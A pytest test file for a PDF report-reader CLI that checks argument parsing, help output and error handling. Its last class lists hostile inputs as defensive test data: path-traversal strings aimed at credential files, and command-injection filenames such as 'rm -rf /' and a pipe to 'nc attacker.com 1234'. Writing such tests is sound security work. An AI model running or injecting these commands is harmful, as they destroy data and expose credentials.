"""
Tests for CLI command validation and help output functionality.
"""

import pytest
import sys
import os
import subprocess
from pathlib import Path
from unittest.mock import patch
import tempfile

# Add the project root to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from cli.report_reader import create_parser, main

class TestCLIValidation:
    """Test CLI command validation and help systems."""
    
    def test_help_output_main(self, capsys):
        """Test main help output."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['--help'])
    
    def test_help_output_process_command(self, capsys):
        """Test process command help output."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['process', '--help'])
    
    def test_help_output_batch_command(self, capsys):
        """Test batch command help output.""" 
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['batch', '--help'])
    
    def test_help_output_extract_command(self, capsys):
        """Test extract command help output."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['extract', '--help'])
    
    def test_required_arguments_process(self):
        """Test that process command requires PDF path."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['process'])  # Missing PDF path
    
    def test_required_arguments_batch(self):
        """Test that batch command requires input and output directories."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['batch'])  # Missing directories
        
        with pytest.raises(SystemExit):
            parser.parse_args(['batch', '/input/dir'])  # Missing output dir
    
    def test_required_arguments_extract(self):
        """Test that extract command requires PDF path."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['extract'])  # Missing PDF path
    
    def test_invalid_log_level(self):
        """Test invalid log level rejection."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['--log-level', 'INVALID', 'process', '/test.pdf'])
    
    def test_invalid_llm_extractor(self):
        """Test invalid LLM extractor rejection."""
        parser = create_parser()
        
        with pytest.raises(SystemExit):
            parser.parse_args(['process', '/test.pdf', '--llm-extractor', 'invalid'])
    
    def test_valid_argument_combinations(self):
        """Test valid argument combinations."""
        parser = create_parser()
        
        # Valid process command
        args = parser.parse_args([
            'process', '/test.pdf', 
            '--output-dir', '/output',
            '--ensemble',
            '--llm-extractor', 'deepseek',
            '--log-level', 'DEBUG'
        ])
        assert args.command == 'process'
        assert args.pdf_path == '/test.pdf'
        assert args.output_dir == '/output'
        assert args.ensemble is True
        assert args.llm_extractor == 'deepseek'
        assert args.log_level == 'DEBUG'
        
        # Valid batch command
        args = parser.parse_args([
            'batch', '/input', 
            '--output-dir', '/output',
            '--pattern', '*.pdf',
            '--max-files', '10',
            '--stop-on-error'
        ])
        assert args.command == 'batch'
        assert args.input_dir == '/input'
        assert args.output_dir == '/output'
        assert args.pattern == '*.pdf'
        assert args.max_files == 10
        assert args.stop_on_error is True
        
        # Valid extract command
        args = parser.parse_args([
            'extract', '/test.pdf',
            '--llm-extractor', 'llama3',
            '--json-output'
        ])
        assert args.command == 'extract'
        assert args.pdf_path == '/test.pdf'
        assert args.llm_extractor == 'llama3'
        assert args.json_output is True


class TestCLIDocumentation:
    """Test CLI documentation and usage examples."""
    
    def test_usage_examples_in_docstring(self):
        """Test that usage examples are present in module docstring."""
        from cli import report_reader
        
        docstring = report_reader.__doc__
        assert docstring is not None
        
        # Check for key usage examples
        assert "process /path/to/report.pdf" in docstring
        assert "batch /path/to/reports/" in docstring
        assert "--ensemble" in docstring
        assert "--llm-extractor" in docstring
        assert "extract /path/to/report.pdf" in docstring
    
    def test_command_descriptions(self):
        """Test that all commands have proper descriptions."""
        parser = create_parser()
        
        # Get subparsers
        subparsers_actions = [
            action for action in parser._actions 
            if isinstance(action, parser._get_parser_class()._SubParsersAction)
        ]
        
        assert len(subparsers_actions) == 1
        subparsers = subparsers_actions[0]
        
        # Check that all expected commands exist
        expected_commands = ['process', 'batch', 'extract']
        for command in expected_commands:
            assert command in subparsers.choices
    
    def test_argument_help_text(self):
        """Test that arguments have helpful descriptions."""
        parser = create_parser()
        
        # Test main parser arguments
        help_text = parser.format_help()
        assert "--log-level" in help_text
        assert "--locale" in help_text
        
        # Test process command help
        process_parser = parser._get_subparser_for_command('process')
        if process_parser:
            help_text = process_parser.format_help()
            assert "--output-dir" in help_text
            assert "--ensemble" in help_text
            assert "--llm-extractor" in help_text
    
    def _get_subparser_for_command(self, parser, command):
        """Helper to get subparser for a specific command."""
        for action in parser._actions:
            if isinstance(action, parser._get_parser_class()._SubParsersAction):
                return action.choices.get(command)
        return None


class TestCLIErrorMessages:
    """Test CLI error message quality and clarity."""
    
    @patch('sys.argv')
    def test_no_command_error_message(self, mock_argv):
        """Test error message when no command is provided."""
        mock_argv.__getitem__.side_effect = ["report_reader.py"]
        mock_argv.__len__.return_value = 1
        
        with patch('sys.exit') as mock_exit:
            with patch('builtins.print') as mock_print:
                main()
                mock_exit.assert_called_with(1)
    
    def test_file_not_found_error_handling(self):
        """Test handling of file not found errors."""
        from cli.report_reader import ReportReaderCLI
        
        cli = ReportReaderCLI()
        result = cli.process_single_pdf("/nonexistent/file.pdf", verbose=False)
        
        assert "error" in result
        assert "PDF file not found" in result["error"]
        assert "/nonexistent/file.pdf" in result["error"]
    
    def test_directory_not_found_error_handling(self):
        """Test handling of directory not found errors."""
        from cli.report_reader import ReportReaderCLI
        
        cli = ReportReaderCLI()
        
        with pytest.raises(FileNotFoundError) as exc_info:
            cli.batch_process("/nonexistent/directory", "/output")
        
        assert "Input directory not found" in str(exc_info.value)


class TestCLIVersioning:
    """Test CLI version and compatibility information."""
    
    def test_python_version_compatibility(self):
        """Test that CLI works with current Python version."""
        # The CLI should work with Python 3.8+
        assert sys.version_info >= (3, 8), "CLI requires Python 3.8 or higher"
    
    def test_import_compatibility(self):
        """Test that all required modules can be imported."""
        try:
            from cli.report_reader import (
                ReportReaderCLI,
                create_parser, 
                main
            )
            # If we get here, imports work
            assert True
        except ImportError as e:
            pytest.fail(f"Failed to import CLI modules: {e}")


class TestCLISecurityConsiderations:
    """Test CLI security and input validation."""
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        from cli.report_reader import ReportReaderCLI
        
        cli = ReportReaderCLI()
        
        # Test various path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in malicious_paths:
            result = cli.process_single_pdf(path, verbose=False)
            # Should fail with file not found, not crash
            assert "error" in result
    
    def test_command_injection_protection(self):
        """Test protection against command injection in filenames."""
        from cli.report_reader import ReportReaderCLI
        
        cli = ReportReaderCLI()
        
        # Test filenames with potential command injection
        injection_attempts = [
            "file.pdf; rm -rf /",
            "file.pdf && cat /etc/passwd",
            "file.pdf | nc attacker.com 1234",
            "$(rm -rf /)"
        ]
        
        for filename in injection_attempts:
            result = cli.process_single_pdf(filename, verbose=False)
            # Should handle gracefully without executing commands
            assert "error" in result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])